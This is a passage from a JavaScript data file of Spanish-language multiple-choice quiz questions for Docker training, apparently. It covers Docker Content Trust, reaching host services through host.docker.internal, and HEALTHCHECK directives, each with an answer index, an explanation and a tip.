    explanation: 'Docker Content Trust garantiza integridad y autenticidad en la cadena de suministro de software (Supply Chain Security). Al publicar una imagen, el autor la firma criptográficamente con una clave privada offline. Al activar DCT en el cliente o cluster, Docker verifica la firma antes de permitir su ejecución, bloqueando ataques de intermediarios (Man-In-The-Middle) o imágenes comprometidas en el registro.',
    proTip: 'En Kubernetes moderno y entornos cloud-native, esta misma verificación de firmas se realiza a través de Sigstore/Cosign y políticas de Kyverno o Gatekeeper.'
  },
  {
    id: 'doc-24',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cómo accedes al servicio ejecutándose en el "localhost" del sistema host desde adentro de un contenedor Docker en Linux y en Docker Desktop?',
    codeSnippet: `// Dentro de la app en el contenedor:
const HOST_DB_URL = "http://host.docker.internal:5432";`,
    codeLanguage: 'javascript',
    options: [
      'En Docker Desktop (macOS/Windows) se usa el hostname especial "host.docker.internal". En Linux nativo, se debe agregar el flag "--add-host=host.docker.internal:host-gateway" al comando docker run.',
      'Usando "127.0.0.1", ya que el contenedor comparte el loopback del host por defecto.',
      'Escribiendo "localhost" directamente sin ninguna configuración.',
      'No es posible acceder a servicios del host desde un contenedor bajo ninguna circunstancia.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Dentro de un contenedor, "127.0.0.1" o "localhost" apunta a su propia interfaz de red loopback aislada. Para llegar al host, Docker Desktop resuelve "host.docker.internal" a la IP del gateway de la VM. En Linux nativo, este nombre no viene habilitado por defecto y se debe mapear explícitamente con "--add-host=host.docker.internal:host-gateway".',
    proTip: 'En docker-compose.yml para Linux, puedes añadir a tu servicio: "extra_hosts: [\'host.docker.internal:host-gateway\']".'
  },
  {
    id: 'doc-25',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Por qué la directiva "HEALTHCHECK" dentro de un Dockerfile es superior a depender únicamente de que el proceso principal siga vivo?',
    codeSnippet: `HEALTHCHECK --interval=30s --timeout=3s --start-period=10s --retries=3 \\
  CMD wget --no-verbose --tries=1 --spider http://localhost:8080/health || exit 1`,
    codeLanguage: 'dockerfile',
    options: [
      'Detecta escenarios de "Deadlock" o loops infinitos donde el proceso sigue vivo en la tabla de procesos (PID activo), pero la aplicación está congelada y ya no responde a peticiones de red.',
      'Reinicia la máquina anfitriona si la memoria RAM se calienta.',
      'Permite que el contenedor se ejecute más rápido en producción.',
      'Es un requisito estricto para compilar imágenes en plataformas ARM.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Un proceso puede estar en ejecución ("docker ps" reporta UP), pero atrapado en un bloqueo mutuo (deadlock), agotamiento de conexiones a la base de datos o fallo de red. El HEALTHCHECK ejecuta un comando periódico: si devuelve 0 el estado es "healthy", si devuelve 1 o falla en los reintentos, el estado cambia a "unhealthy", permitiendo que orquestadores (Docker Swarm, Compose o K8s) reinicien o desvíen tráfico del contenedor.',
    proTip: '"--start-period" es crucial para apps que tardan en arrancar (como JVMs o apps con migraciones): evita que los fallos iniciales cuenten contra los reintentos permitidos.'
  }
];
